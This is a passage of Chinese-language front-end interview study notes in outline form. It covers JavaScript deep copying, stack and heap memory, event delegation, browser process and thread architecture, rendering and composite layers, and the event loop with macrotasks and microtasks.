实现\r\n\r\n\t\t- （1）JSON.parse()方法\r\n\r\n\t\t\t- 使用JSON.stringify进行序列化，JSON.parse进行反序列化，实现\"偷懒版\"的深复制\r\n\t\t\t- 坏处：\r\n\r\n\t\t\t\t- （1）它会抛弃对象的constructor。也就是深拷贝之后，不管这个对象原来的构造函数是什么，在深拷贝之后都会变成Object。\r\n\t\t\t\t- （2）这种方法能正确处理的对象只有 Number, String, Boolean, Array, 扁平对象，即那些能够被 json 直接表示的数据结构。RegExp对象是无法通过这种方式深拷贝。\r\n\t\t\t\t- （3）用此法无法深复制对象中的方法\r\n\r\n\t\t\t\t\t- 原因是 一个对象 上可能还有很多其他的无法被转为json string的东西\r\n\r\n\t\t\t\t- （4）通过 deep clone 一般都是有限定复制层次的，一般情况下不会无限层的复制下去。如果使用 JSON 方式来复制，通常不能控制层次。\r\n\r\n\t\t\t- JSON.parse()是怎么实现深拷贝的？\r\n\r\n\t\t\t\t- var a = JSON.stringify(oldObject)  \r\n// a是一个oldObject序列化后得到的字符串 和 oldObject没任何关系的新对象\r\n\t\t\t\t- var b = JSON.parse(a); \r\n// b 是从字符串a反序列化为一个全新的对象 所以 不但和a没关系 和oldObject更没关系\r\n\t\t\t\t- 序列化是一种将对象以一连串的字节描述的过程；反序列化是一种将这些字节重建成一个对象的过程\r\n\r\n\t\t- （2）使用递归拷贝\r\n\r\n\t\t\t- 避免相互引用对象导致死循环，如initalObj.a = initalObj的情况\r\n\r\n\t\t- （3）$.extend()的深拷贝和浅拷贝\r\n\r\n\t\t\t- 用法\r\n\r\n\t\t\t- $.extend()的浅拷贝\r\n\r\n\t\t\t\t- 如果第二个参数对象有的属性第一个参数对象也有，那么不会进行相同参数内部的比较，直接将第一个对象的相同参数覆盖。\r\n\r\n\t\t\t- $.extend()的深拷贝\r\n\r\n\t\t\t\t- ：如果第二个参数对象有的属性第一个参数对象也有，还要继续在这个相同的参数向下一层找，比较相同参数的对象中是否还有不一样的属性，如果有，将其继承到第一个对象，如果没有，则覆盖。\r\n\r\n- 区别？\r\n\r\n\t- \r\n浅复制只复制一层对象的属性，而深复制则递归复制了所有层级。浅复制是对对象地址的复制，而深复制则是让其指向不同的堆内存\r\n\t- 浅拷贝\r\n\r\n\t\t- 深拷贝\r\n\r\n- 堆内存与栈内存\r\n\r\n\t- 为什么会有栈内存和堆内存之分？\r\n\r\n\t\t- 通常与垃圾回收机制有关。为了使程序运行时占用的内存最小。\r\n\t\t- stack为自动分配的内存空间，它由系统自动释放；而heap则是动态分配的内存，大小不定也不会自动释放。　\r\n\r\n\t- 什么存于栈内存？什么存于堆内存？\r\n\r\n\t\t- 当一个方法执行时，每个方法都会建立自己的内存栈，在这个方法内定义的变量将会逐个放入这块栈内存里，随着方法的执行结束，这个方法的内存栈也将自然销毁了。因此，所有在方法中定义的变量都是放在栈内存中的；\r\n\t\t- 当我们在程序中创建一个对象时，这个对象将被保存到运行时数据区中，以便反复利用（因为对象的创建成本通常较大），这个运行时数据区就是堆内存。堆内存中的对象不会随方法的结束而销毁，即使方法结束后，这个对象还可能被另一个引用变量所引用（方法的参数传递时很常见），则这个对象依然不会被销毁，只有当一个对象没有任何引用变量引用它时，系统的垃圾回收机制才会在核实的时候回收它。\r\n\r\n\t- 区别\r\n\r\n\t\t- 栈中存储的是基础变量以及一些对象的引用变量，基础变量的值是存储在栈中，而引用变量存储在栈中的是指向堆中的数组或者对象的地址，这就是为何修改引用类型总会影响到其他指向这个地址的引用变量。\r\n\r\n### 【事件流】什么是事件流，事件代理委托原理\r\n\r\n- 事件流\r\n\r\n\t- 定义\r\n\r\n\t\t-  事件流描述的是从页面中接受事件的顺序\r\n\t\t- document.querySelector(）\r\n\r\n\t\t\t- 如果没有找到匹配元素，则返回 null，如果找到多个匹配元素，则返回第一个匹配到的元素。\r\n\r\n\t\t- target.addEventListener(type, listener[, useCapture])\r\n\r\n\t\t\t- 接受三个参数。\r\n\r\n\t\t\t\t- type：事件名称，大小写敏感。\r\n\t\t\t\t- listener：监听函数。事件发生时，会调用该监听函数。\r\n\t\t\t\t- useCapture：布尔值，表示监听函数是否在捕获阶段（capture）触发，默认为false（监听函数只在冒泡阶段被触发）。\r\n\r\n\t- 事件捕获的三个阶段\r\n\r\n\t\t- 事件捕获阶段\r\n\t\t- 目标阶段\r\n\t\t- 事件冒泡阶段\r\n\r\n\t- Event对象的常见应用\r\n\r\n\t\t- 取消事件的默认行为\r\n\r\n\t\t\t- event.preventDefault()\r\n\r\n\t\t- 取消事件的进一步捕获或冒泡\r\n\r\n\t\t\t- event.stopPropagation()\r\n\r\n\t\t- 处理事件响应优先级\r\n\r\n\t\t\t- event.stopImmediatePropagation()\r\n\r\n\t\t- 当前被绑定事件的对象\r\n\r\n\t\t\t- event.currentTarget\r\n\r\n\t\t- 当前被点击的对象\r\n\r\n\t\t\t- event.target\r\n\r\n- 事件的代理\r\n\r\n\t- 原理\r\n\r\n\t\t- 事件代理就是在祖先级DOM元素绑定一个事件，当触发子孙级DOM元素的事件时，利用事件流的原理来触发绑定在祖先级DOM的事件。\r\n\r\n\t- 检查事件源event.target\r\n\r\n### 【面试：JS运行机制】\r\n\r\n- 【面试：JS 执行机制】这一次，彻底弄懂 JavaScript 执行机制\r\n\r\n\t- 关于多线程\r\n\r\n\t\t- 一切javascript版的\"多线程\"都是用单线程模拟出来的\r\n\r\n\t- javascript事件循环\r\n\r\n\t\t- 同步任务\r\n\r\n\t\t\t- 当我们打开网站时，网页的渲染过程就是一大堆同步任务，比如页面骨架和页面元素的渲染。\r\n\r\n\t\t- 异步任务\r\n\r\n\t\t\t- 而像加载图片音乐之类占用资源大耗时久的任务，就是异步任务。\r\n\r\n\t\t\t- （1）同步和异步任务分别进入不同的执行\"场所\"，同步的进入主线程，异步的进入Event Table并注册函数。\r\n\t\t\t- （2）当指定的事情完成时，Event Table会将这个函数移入Event Queue（事件队列）。\r\n\t\t\t- （3）主线程内的任务执行完毕为空，会去Event Queue（事件队列）读取对应的回调函数，进入主线程执行。\r\n\t\t\t- （4）上述过程会不断重复，也就是常说的Event Loop(事件循环)。\r\n\r\n\t\t- 怎么知道主线程执行栈为空啊？\r\n\r\n\t\t\t- js引擎存在monitoring process进程，会持续不断的检查主线程执行栈是否为空，一旦为空，就会去Event Queue那里检查是否有等待被调用的函数。\r\n\r\n- 【面试：JS 执行机制】从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理\r\n\r\n\t- 区分进程和线程\r\n\r\n\t\t- \r\n- 进程是一个工厂，工厂有它的独立资源 -> 系统分配的内存（独立的一块内存）\r\n\t\t- - 工厂之间相互独立 -> 进程之间相互独立\r\n\t\t- - 线程是工厂中的工人，多个工人协作完成任务 -> 多个线程在进程中协作完成任务\r\n\t\t- - 工厂内有一个或多个工人 -> 一个进程由一个或多个线程组成\r\n\t\t- - 工人之间共享空间 -> 同一进程下的各个线程之间共享程序的内存空间（包括代码段、数据集、堆等）\r\n\t\t- 线程与进程\r\n\r\n\t\t\t- \r\n进程是cpu资源分配的最小单位（是能拥有资源和独立运行的最小单位）\r\n\t\t\t- 线程是cpu调度的最小单位（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）\r\n\r\n\t\t- tips\r\n\r\n\t\t\t- \r\n不同进程之间也可以通信，不过代价较大\r\n\t\t\t- 现在，一般通用的叫法：单线程与多线程，都是指在一个进程内的单和多。（所以核心还是得属于一个进程才行）\r\n\r\n\t- 浏览器是多进程的\r\n\r\n\t\t- 初步认知\r\n\r\n\t\t\t- \r\n浏览器是多进程的\r\n\t\t\t- 浏览器之所以能够运行，是因为系统给它的进程分配了资源（cpu、内存）\r\n\t\t\t- 简单点理解，每打开一个Tab页，就相当于创建了一个独立的浏览器进程。\r\n\r\n\t\t- 浏览器都包含哪些进程？\r\n\r\n\t\t\t- Browser进程：浏览器的主进程（负责协调、主控），只有一个。作用有\r\n\r\n\t\t\t\t- 负责浏览器界面显示，与用户交互。如前进，后退等\r\n\t\t\t\t- 负责各个页面的管理，创建和销毁其他进程\r\n\t\t\t\t- 将Renderer进程得到的内存中的Bitmap，绘制到用户界面上\r\n\t\t\t\t- 网络资源的管理，下载等\r\n\r\n\t\t\t- 第三方插件进程：每种类型的插件对应一个进程，仅当使用该插件时才创建\r\n\t\t\t- GPU进程：最多一个，用于3D绘制等\r\n\t\t\t- 浏览器渲染进程（浏览器内核）（Render进程，内部是多线程的）：默认每个Tab页面一个进程，互不影响。主要作用为页面渲染，脚本执行，事件处理等\r\n\r\n\t\t- 浏览器多进程的优势\r\n\r\n\t\t\t- 避免单个page crash影响整个浏览器\r\n\t\t\t- 避免第三方插件crash影响整个浏览器\r\n\t\t\t- 多进程充分利用多核优势\r\n\t\t\t- 方便使用沙盒模型隔离插件等进程，提高浏览器稳定性\r\n\t\t\t- 简单理解\r\n\r\n\t\t\t\t- 如果浏览器是单进程，那么某个Tab页崩溃了，就影响了整个浏览器，体验有多差；同理如果是单进程，插件崩溃了也会影响整个浏览器；而且多进程还有其它的诸多优势。当然，内存等资源消耗也会更大，有点空间换时间的意思。\r\n\r\n\t\t\t\t\t- orw83p\r\n\r\n\t\t- 重点是浏览器内核（Renderer渲染进程）\r\n\r\n\t\t\t- 初步认知\r\n\r\n\t\t\t\t- 对于普通的前端操作来说，最终要的是渲染进程，页面的渲染，JS的执行，事件的循环，都在这个进程内进行\r\n\r\n\t\t\t- 该进程包含线程有：\r\n\r\n\t\t\t\t- GUI渲染线程\r\n\r\n\t\t\t\t\t- 负责渲染浏览器界面，解析HTML，CSS，构建DOM树和RenderObject树，布局和绘制等。\r\n\t\t\t\t\t- 当界面需要重绘（Repaint）或由于某种操作引发回流(reflow)时，该线程就会执行\r\n\t\t\t\t\t- 注意，GUI渲染线程与JS引擎线程是互斥的，当JS引擎执行时GUI线程会被挂起（相当于被冻结了），GUI更新会被保存在一个队列中等到JS引擎空闲时立即被执行。\r\n\r\n\t\t\t\t- JS引擎线程\r\n\r\n\t\t\t\t\t- \r\n也称为JS内核，负责处理Javascript脚本程序。（例如V8引擎）\r\n\t\t\t\t\t- JS引擎线程负责解析Javascript脚本，运行代码。\r\n\t\t\t\t\t- JS引擎一直等待着任务队列中任务的到来，然后加以处理，一个Tab页（renderer进程）中无论什么时候都只有一个JS线程在运行JS程序\r\n\t\t\t\t\t- 同样注意，GUI渲染线程与JS引擎线程是互斥的，所以如果JS执行的时间过长，这样就会造成页面的渲染不连贯，导致页面渲染加载阻塞。\r\n\r\n\t\t\t\t- 事件触发线程\r\n\r\n\t\t\t\t\t- \r\n归属于浏览器而不是JS引擎，用来控制事件循环（可以理解，JS引擎自己都忙不过来，需要浏览器另开线程协助）\r\n\t\t\t\t\t- 当JS引擎执行代码块如setTimeOut时（也可来自浏览器内核的其他线程,如鼠标点击、AJAX异步请求等），会将对应任务添加到事件线程中\r\n\t\t\t\t\t- 当对应的事件符合触发条件被触发时，该线程会把事件添加到待处理队列的队尾，等待JS引擎的处理\r\n\t\t\t\t\t- 注意，由于JS的单线程关系，所以这些待处理队列中的事件都得排队等待JS引擎处理（当JS引擎空闲时才会去执行）\r\n\r\n\t\t\t\t- 定时触发器线程\r\n\r\n\t\t\t\t\t- \r\n传说中的setInterval与setTimeout所在线程\r\n\t\t\t\t\t- 浏览器定时计数器并不是由JavaScript引擎计数的,（因为JavaScript引擎是单线程的, 如果处于阻塞线程状态就会影响记计时的准确）\r\n\t\t\t\t\t- 因此通过单独线程来计时并触发定时（计时完毕后，添加到事件队列中，等待JS引擎空闲后执行）\r\n\t\t\t\t\t- 注意，W3C在HTML标准中规定，规定要求setTimeout中低于4ms的时间间隔算为4ms。\r\n\r\n\t\t\t\t- 异步http请求线程\r\n\r\n\t\t\t\t\t- \r\n在XMLHttpRequest在连接后是通过浏览器新开一个线程请求\r\n\t\t\t\t\t- 将检测到状态变更时，如果设置有回调函数，异步线程就产生状态变更事件，将这个回调再放入事件队列中。再由JavaScript引擎执行。\r\n\r\n\t\t- Browser进程和浏览器内核（Renderer进程）的通信过程\r\n\r\n\t\t\t- 初步理解\r\n\r\n\t\t\t\t- \r\n如果自己打开任务管理器，然后打开一个浏览器，就可以看到：任务管理器中出现了两个进程（一个是主控进程，一个则是打开Tab页的渲染进程）\r\n\r\n\t\t\t- 整个过程\r\n\r\n\t\t\t\t- Browser进程收到用户请求，首先需要获取页面内容（譬如通过网络下载资源），随后将该任务通过RendererHost接口传递给Render进程\r\n\t\t\t\t- Renderer进程的Renderer接口收到消息，简单解释后，交给渲染线程，然后开始渲染\r\n\r\n\t\t\t\t\t- 渲染线程接收请求，加载网页并渲染网页，这其中可能需要Browser进程获取资源和需要GPU进程来帮助渲染\r\n\t\t\t\t\t- 当然可能会有JS线程操作DOM（这样可能会造成回流并重绘）\r\n\t\t\t\t\t- 最后Render进程将结果传递给Browser进程\r\n\r\n\t\t\t\t- Browser进程接收到结果并将结果绘制出来\r\n\r\n\t- 梳理浏览器内核中线程之间的关系\r\n\r\n\t\t- GUI渲染线程与JS引擎线程互斥\r\n\r\n\t\t\t- \r\n由于JavaScript是可操纵DOM的，如果在修改这些元素属性同时渲染界面（即JS线程和UI线程同时运行），那么渲染线程前后获得的元素数据就可能不一致了。\r\n\t\t\t- 因此为了防止渲染出现不可预期的结果，浏览器设置GUI渲染线程与JS引擎为互斥的关系，当JS引擎执行时GUI线程会被挂起，GUI更新则会被保存在一个队列中等到JS引擎线程空闲时立即被执行。\r\n\r\n\t\t- JS阻塞页面加载\r\n\r\n\t\t\t- \r\n假设JS引擎正在进行巨量的计算，此时就算GUI有更新，也会被保存到队列中，等待JS引擎空闲后执行。 然后，由于巨量计算，所以JS引擎很可能很久很久后才能空闲，自然会感觉到巨卡无比。\r\n\t\t\t- 所以，要尽量避免JS执行时间过长，这样就会造成页面的渲染不连贯，导致页面渲染加载阻塞的感觉。\r\n\r\n\t\t- WebWorker，JS的多线程？\r\n\r\n\t\t\t- 初步理解\r\n\r\n\t\t\t\t- 前文中有提到JS引擎是单线程的，而且JS执行时间过长会阻塞页面，那么JS就真的对cpu密集型计算无能为力么？\r\n\r\n\t\t\t- Web Worker\r\n\r\n\t\t\t\t- \r\n创建Worker时，JS引擎向浏览器申请开一个子线程（子线程是浏览器开的，完全受主线程控制，而且不能操作DOM）\r\n\t\t\t\t- JS引擎线程与worker线程间通过特定的方式通信（postMessage API，需要通过序列化对象来与线程交互特定的数据）\r\n\t\t\t\t- 所以，如果有非常耗时的工作，请单独开一个Worker线程，这样里面不管如何翻天覆地都不会影响JS引擎主线程，只待计算出结果后，将结果通信给主线程即可，perfect!\r\n\r\n\t\t\t- WebWorker与SharedWorker\r\n\r\n\t\t\t\t- Web Worker\r\n\r\n\t\t\t\t\t- WebWorker只属于某个页面，不会和其他页面的Render进程（浏览器内核进程）共享\r\n\t\t\t\t\t- 所以Chrome在Render进程中（每一个Tab页就是一个render进程）创建一个新的线程来运行Worker中的JavaScript程序。\r\n\r\n\t\t\t\t- SharedWorker\r\n\r\n\t\t\t\t\t- SharedWorker是浏览器所有页面共享的，不能采用与Worker同样的方式实现，因为它不隶属于某个Render进程，可以为多个Render进程共享使用\r\n\t\t\t\t\t- 所以Chrome浏览器为SharedWorker单独创建一个进程来运行JavaScript程序，在浏览器中每个相同的JavaScript只存在一个SharedWorker进程，不管它被创建多少次。\r\n\r\n\t\t\t\t- 本质上就是进程和线程的区别。SharedWorker由独立的进程管理，WebWorker只是属于render进程下的一个线程\r\n\r\n\t- 简单梳理下浏览器渲染流程\r\n\r\n\t\t- 前期工作\r\n\r\n\t\t\t- 浏览器输入url，浏览器主进程接管，开一个下载线程，然后进行 http请求（略去DNS查询，IP寻址等等操作），然后等待响应，获取内容，随后将内容通过RendererHost接口转交给Renderer进程\r\n\r\n- 浏览器渲染流程开始\r\n\r\n\t\t- 浏览器器内核拿到内容后，渲染大概可以划分成以下几个步骤\r\n\r\n\t\t\t- 解析html建立dom树\r\n\t\t\t- 解析css构建render树（将CSS代码解析成树形的数据结构，然后结合DOM合并成render树）\r\n\t\t\t- 布局render树（Layout/reflow），负责各元素尺寸、位置的计算\r\n\t\t\t- 绘制render树（paint），绘制页面像素信息\r\n\t\t\t- 浏览器会将各层的信息发送给GPU，GPU会将各层合成（composite），显示在屏幕上。\r\n\t\t\t- 渲染完毕后就是load事件了，之后就是自己的JS逻辑处理了\r\n\r\n\t\t- load事件与DOMContentLoaded事件的先后\r\n\r\n\t\t\t- 当 DOMContentLoaded 事件触发时，仅当DOM加载完成，不包括样式表，图片。 (譬如如果有async加载的脚本就不一定完成)\r\n\t\t\t- 当 onload 事件触发时，页面上所有的DOM，样式表，脚本，图片都已经加载完成了。 （渲染完毕了）\r\n\t\t\t- 顺序是：DOMContentLoaded -> load\r\n\r\n\t\t- CSS加载（头部引入CSS时）是否会阻塞DOM树渲染？\r\n\r\n\t\t  因为你加载css的时候，可能会修改下面DOM节点的样式，\r\n\r\n\t\t  如果css加载不阻塞render树渲染的话，那么当css加载完之后，\r\n\r\n\t\t  render树可能又得重新重绘或者回流了，这就造成了一些没有必要的损耗。\r\n\r\n\t\t  所以干脆就先把DOM树的结构先解析完，把可以做的工作做完，然后等你css加载完之后，\r\n\r\n\t\t  在根据最终的样式来渲染render树，这种做法性能方面确实会比较好一点。\r\n\r\n\t\t\t- css是由单独的下载线程异步下载的。\r\n\t\t\t- css加载不会阻塞DOM树解析（异步加载时DOM照常构建）\r\n\t\t\t- 但会阻塞render树渲染（渲染时需等css加载完毕，因为render树需要css信息）\r\n\r\n\t\t- 普通图层和复合图层\r\n\r\n\t\t\t- 浏览器渲染的图层一般包含两大类：普通图层以及复合图层\r\n\t\t\t- 首先，普通文档流内可以理解为一个复合图层（这里称为默认复合层，里面不管添加多少元素，其实都是在同一个复合图层中）\r\n\t\t\t- 其次，absolute布局（fixed也一样），虽然可以脱离普通文档流，但它仍然属于默认复合层。\r\n\t\t\t- 然后，可以通过硬件加速的方式，声明一个新的复合图层，它会单独分配资源 （当然也会脱离普通文档流，这样一来，不管这个复合图层中怎么变化，也不会影响默认复合层里的回流重绘）\r\n\t\t\t- 可以简单理解下：GPU中，各个复合图层是单独绘制的，所以互不影响，这也是为什么某些场景硬件加速效果一级棒\r\n\t\t\t- 【重点！！！】如何变成复合图层（硬件加速）\r\n\r\n\t\t\t\t- （1）最常用的方式：translate3d、translateZ\r\n\t\t\t\t- （2）opacity属性/过渡动画（需要动画执行的过程中才会创建合成层，动画没有开始或结束后元素还会回到之前的状态）\r\n\t\t\t\t- （3）will-chang属性（这个比较偏僻），一般配合opacity与translate使用（而且经测试，除了上述可以引发硬件加速的属性外，其它属性并不会变成复合层），作用是提前告诉浏览器要变化，这样浏览器会开始做一些优化工作（这个最好用完后就释放）\r\n\t\t\t\t- （4）<video><iframe><canvas><webgl>等元素\r\n\t\t\t\t- （5）其它，譬如以前的flash插件\r\n\r\n\t\t\t- absolute和硬件加速的区别\r\n\r\n\t\t\t\t- absolute虽然可以脱离普通文档流，但是无法脱离默认复合层。所以，就算absolute中信息改变时不会改变普通文档流中render树，但是，浏览器最终绘制时，是整个复合层绘制的，所以absolute中信息的改变，仍然会影响整个复合层的绘制。（浏览器会重绘它，如果复合层中内容多，absolute带来的绘制信息变化过大，资源消耗是非常严重的）\r\n\t\t\t\t- 而硬件加速直接就是在另一个复合层了（另起炉灶），所以它的信息改变不会影响默认复合层 （当然了，内部肯定会影响属于自己的复合层），仅仅是引发最后的合成（输出视图）\r\n\r\n\t\t\t- 复合图层的作用？\r\n\r\n\t\t\t\t- 一般一个元素开启硬件加速后会变成复合图层，可以独立于普通文档流中，改动后可以避免整个页面重绘，提升性能\r\n\t\t\t\t- 但是尽量不要大量使用复合图层，否则由于资源消耗过度，页面反而会变的更卡\r\n\r\n\t- 从Event Loop谈JS的运行机制\r\n\r\n\t\t- 发生时机\r\n\r\n\t\t\t- 到此时，已经是属于浏览器页面初次渲染完毕后的事情，JS引擎的一些运行机制分析。\r\n\r\n\t\t- Event Loop（事件循环机制的核心是：JS引擎线程和事件触发线程）\r\n\r\n\t\t\t- JS分为同步任务和异步任务\r\n\t\t\t- 同步任务都在主线程上执行，形成一个执行栈\r\n\t\t\t- 主线程之外，事件触发线程管理着一个任务队列，只要异步任务有了运行结果，就在任务队列之中放置一个事件。\r\n\t\t\t- 一旦执行栈中的所有同步任务执行完毕（此时JS引擎空闲），系统就会读取任务队列，将可运行的异步任务添加到可执行栈中，开始执行。\r\n\r\n\t\t- 单独说说定时器\r\n\r\n\t\t\t- 为什么需要定时器线程？\r\n\r\n\t\t\t\t- 为什么要单独的定时器线程？因为JavaScript引擎是单线程的, 如果处于阻塞线程状态就会影响记计时的准确，因此很有必要单独开一个线程用来计时。\r\n\r\n\t\t\t- 什么时候会用到定时器线程？\r\n\r\n\t\t\t\t- 当使用setTimeout或setInterval时，它需要定时器线程计时，计时完成后就会将特定的事件推入事件队列中。\r\n\r\n\t\t\t- 代码的执行情况\r\n\r\n\t\t\t- setTimeout而不是setInterval\r\n\r\n\t\t\t\t- setTimeout\r\n\r\n\t\t\t\t\t- 每次setTimeout计时到后就会去执行，然后执行一段时间后才会继续setTimeout，中间就多了误差 （误差多少与代码执行时间有关）\r\n\r\n\t\t\t\t- setInterval\r\n\r\n\t\t\t\t\t- setInterval则是每次都精确的隔一段时间推入一个事件 （但是，事件的实际执行时间不一定就准确，还有可能是这个事件还没执行完毕，下一个事件就来了）\r\n\t\t\t\t\t- JS引擎会对setInterval进行优化，如果当前事件队列中有setInterval的回调，不会重复添加。不过，仍然是有很多问题。。。\r\n\r\n\t\t\t- 事件循环进阶：macrotask与microtask\r\n\r\n\t\t\t\t- 初步认识\r\n\r\n\t\t\t\t\t- \r\nJS中分为两种任务类型：macrotask和microtask，在ECMAScript中，microtask称为jobs，macrotask可称为task\r\n\r\n\t\t\t\t- macrotask（又称之为宏任务）\r\n\r\n\t\t\t\t\t- 可以理解是每次执行栈执行的代码就是一个宏任务（包括每次从事件队列中获取一个事件回调并放到执行栈中执行）\r\n\t\t\t\t\t- 每一个task会从头到尾将这个任务执行完毕，不会执行其它\r\n\t\t\t\t\t- 浏览器为了能够使得JS内部task与DOM任务能够有序的执行，会在一个task执行结束后，在下一个 task 执行开始前，对页面进行重新渲染 （task->渲染->task->...）\r\n\r\n\t\t\t\t- microtask（又称为微任务）\r\n\r\n\t\t\t\t\t- 可以理解是在当前 task 执行结束后立即执行的任务\r\n\t\t\t\t\t- 也就是说，在当前task任务后，下一个task之前，在渲染之前\r\n\t\t\t\t\t- 所以它的响应速度相比setTimeout（setTimeout是task）会更快，因为无需等渲染\r\n\t\t\t\t\t- 也就是说，在某一个macrotask执行完后，就会将在它执行期间产生的所有microtask都执行完毕（在渲染前）\r\n\r\n\t\t\t\t- 什么样的场景会形成macrotask和microtask？\r\n\r\n\t\t\t\t\t- macrotask：主进程，setTimeout，setInterval，setImmediate, I/O, rendering等（可以看到，事件队列中的每一个事件都是一个macrotask）\r\n\t\t\t\t\t- microtask：Promise，process.nextTick，Object.observe, MutationObserver等\r\n\r\n\t\t\t\t- 各自使用时机？\r\n\r\n\t\t\t\t\t- 至于什么时候需要使用 microtask 呢? 我觉得这个问题很好地指出两者(macrotask, microtask)的不同, 在你觉得需要将这个异步任务同步化的时候, 就使用\r\nmicrotask , 否则就使用 macrotask.换种说法, 也就是这个任务你需要尽可能快地执行, 就使用 microtask.\r\n\r\n\t\t\t\t- 补充：在node环境下，process.nextTick的优先级高于Promise，也就是可以简单理解为：在宏任务结束后会先执行微任务队列中的nextTickQueue部分，然后才会执行微任务中的Promise部分。\r\n\t\t\t\t- 小测试加补充：setTimeout触发时机不明，受机器与运行环境影响很大，产生很多不确定的因素。\r\n\r\n### 【异步设计】探寻JavaScript的异步设计（理解性）\r\n\r\n- 开始\r\n\r\n\t- 一切得先从CPU开始讲起，CPU的指令执行速度是远高于硬盘读取速度和主存读取速度的。而I/O操作就会涉及到硬盘存取和主存读取，常见的I/O操作有文件I/O,网络I/O。(I/O = Input / Output)。\r\n\t- 所以，观察以下这一段伪代码：\r\n\r\n\t\t- 在CPU眼中，他会把代码看成这两部分：\r\n\r\n\t\t\t- 绿色部分因为不涉及到I/O操作，所以CPU执行速度超快，但是当运行到红色部分时，却是一个非常耗时的操作，而这段时间，CPU是处于一个’无所事事’的状态（DMA获取总线控制权之后一切I/O与CPU无关），因为文件如果没有读取进来，下面的工作也无法开展。\r\n\r\n\t- 同步在这里的意思，即书写代码的顺序就是代码执行的顺序，如果JavaScript设计成同步的话，那么当执行到openFile这一行的时候，将会等待该I/O操作完成CPU才继续往下执行。\r\n\r\n\t\t- 设想一下，当发送Ajax请求(网络I/O)的时候，整个页面被阻塞无法操作将会是多差的体验。\r\n\t\t- 而诸如鼠标点击事件，滑动事件，失焦事件，在CPU看来，都是处理得特别慢的事件（虽然对我们来说是一瞬间的事情），如果将JavaScript设计成同步，也会特别浪费CPU性能。\r\n\r\n\t- 而阻塞和非阻塞关注CPU在I/O发生时的工作情况\r\n\r\n\t\t- 怎样理解阻塞非阻塞与同步异步的区别？\r\n\r\n\t\t\t- 1.同步与异步\r\n\r\n\t\t\t\t- 概述\r\n\r\n\t\t\t\t\t- 同步和异步关注的是消息通信机制\r\n\r\n\t\t\t\t- 同步\r\n\r\n\t\t\t\t\t- 就是在发出一个*调用*时，在没有得到结果之前，该*调用*就不返回。但是一旦调用返回，就得到返回值了。\r\n\t\t\t\t\t- 换句话说，就是由*调用者*主动等待这个*调用*的结果。\r\n\r\n\t\t\t\t- 异步\r\n\r\n\t\t\t\t\t- 相反，*调用*在发出之后，这个调用就直接返回了，所以没有返回结果。\r\n\t\t\t\t\t- 换句话说，当一个异步过程调用发出后，调用者不会立刻得到结果。而是在*调用*发出后，*被调用者*通过状态、通知来通知调用者，或通过回调函数处理这个调用。\r\n\r\n\t\t\t\t- 举个通俗的例子\r\n\r\n\t\t\t\t\t- 你打电话问书店老板有没有《分布式系统》这本书，如果是同步通信机制，书店老板会说，你稍等，”我查一下\"，然后开始查啊查，等查好了（可能是5秒，也可能是一天）告诉你结果（返回结果）。\r\n\t\t\t\t\t- 而异步通信机制，书店老板直接告诉你我查一下啊，查好了打电话给你，然后直接挂电话了（不返回结果）。然后查好了，他会主动打电话给你。在这里老板通过“回电”这种方式来回调。\r\n\r\n\t\t\t- 2. 阻塞与非阻塞\r\n\r\n\t\t\t\t- 概述\r\n\r\n\t\t\t\t\t- 阻塞和非阻塞关注的是程序在等待调用结果（消息，返回值）时的状态.\r\n\r\n\t\t\t\t- 阻塞\r\n\r\n\t\t\t\t\t- 阻塞调用是指调用结果返回之前，当前线程会被挂起。调用线程只有在得到结果之后才会返回。\r\n\r\n\t\t\t\t- 非阻塞\r\n\r\n\t\t\t\t\t- 非阻塞调用指在不能立刻得到结果之前，该调用不会阻塞当前线程。\r\n\r\n\t\t\t\t- 还是上面的例子\r\n\r\n\t\t\t\t\t- 你打电话问书店老板有没有《分布式系统》这本书，你如果是阻塞式调用，你会一直把自己“挂起”，直到得到这本书有没有的结果\r\n\t\t\t\t\t- 如果是非阻塞式调用，你不管老板有没有告诉你，你自己先一边去玩了， 当然你也要偶尔过几分钟check一下老板有没有返回结果。\r\n\t\t\t\t\t- 在这里阻塞与非阻塞与是否同步异步无关。跟老板通过什么方式回答你结果无关。\r\n\r\n\t\t\t- 阻塞和非阻塞，应该描述的是一种状态，同步与非同步描述的是行为方式\r\n\r\n\t\t- 阻塞式\r\n\r\n\t\t\t- 在上面这个读取文件的例子中，如果在读取文件的同时，该线程被‘挂起’（可以理解为进程的阻塞态），CPU不在关注这个线程直到结果被返回，属于阻塞式\r\n\r\n\t\t- 非阻塞式\r\n\r\n\t\t\t- 如果在读取文件的同时，CPU会时不时关注并检查一遍结果是否返回，则属于非阻塞式\r\n\r\n\t- 异步则解决了代码被耗时任务阻止其往下执行的缺点\r\n\r\n- 多线程异步有着比较好的解决方案\r\n\r\n\t- （1）给涉及到I/O操作的部分新开一个线程执行\r\n\t- （2）主线程不等待继续往下执行\r\n\t- （3）I/O线程执行完之后将结果写回公共区并通知主线程(也可以是主线程去轮询)\r\n\t- （3）主线程执行其回调\r\n\r\n- JavaScript是一门单线程语言，本身无法提供多线程，那么是通过怎样的机制来实现异步的？\r\n\r\n\t- 先给出答案\r\n\r\n\t\t- JavaScript通过事件循环和浏览器各线程协调共同实现异步\r\n\r\n\t- JavaScript认为任务分为两种\r\n\r\n\t\t- 一种是全由CPU决定完成速度的任务，我们称其为同步任务。\r\n\t\t- 一种是由多种因素（如硬盘读取速度，网速，点击反馈速度）决定完成速度的任务，我们称其为异步任务。\r\n\t\t- 举个简单的例子\r\n\r\n\t\t\t- 函数声明，for循环，变量声明，赋值操作等都可以属于同步任务\r\n\t\t\t- 读取文件，网络请求，网页事件都看做异步任务\r\n\r\n\t- 事件循环\r\n\r\n\t\t- JavaScript将所有的异步任务都会放进一个队列里面，在执行完所有的同步任务之后，会去队列中找到最先进入队列的异步任务执行。\r\n\r\n\t\t- 仔细观察上图，结合浏览器多线程设计：\r\n\r\n\t\t\t- JavaScript线程首先执行同步任务\r\n\t\t\t- 在执行完同步任务之后，会去异步任务队列的队头取出任务执行\r\n\t\t\t- 浏览器各个线程会在事件触发且完成事件之后将回调函数写入异步队列（先进先出队列）\r\n\r\n\t\t- 事件循环\r\n\r\n\t\t\t- 因为诸如事件触发，http请求都是耗时无法直接确定的任务，也就是说JavaScript线程无法得知异步的任务回调函数究竟什么时候会写入异步任务队列，那么这个地方，就需要一个机制，去时刻轮询这个任务队列，这就是事件循环(event loop)\r\n\r\n- 讨论下为什么这样设计\r\n\r\n\t- 